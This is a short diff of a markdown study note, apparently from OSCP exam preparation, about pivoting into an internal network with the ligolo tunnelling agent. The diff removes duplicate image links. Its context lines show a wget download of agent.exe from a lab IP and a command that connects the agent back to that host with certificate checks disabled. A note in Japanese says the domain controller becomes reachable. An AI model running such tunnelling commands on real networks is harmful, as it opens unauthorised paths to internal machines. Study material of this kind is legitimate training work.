@@ -9,14 +9,6 @@ wget http://192.168.45.173/agent.exe -outfile agent.exe
 3. Start the ligolo agent to connect to the server 
 ./agent.exe -connect 192.168.45.173:443 -ignore-cert
 
-<img src="https://github.com/timrekmlac/Cybersecurity-Study/blob/ba79d1edd7ee4288ad0cbb6090862efaf0d65c09/OSCP/images/image.png">
-
-<img src="https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/image.png?raw=true">
-
-![Architecture Diagram](https://raw.githubusercontent.com/timrekmlac/Cybersecurity-Study/main/OSCP/images/image.png)
-
-<internal machine>
-
 ![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/image.png?raw=true)
 
 ここで、internal machine である、DCにもアクセス出来る様になる。
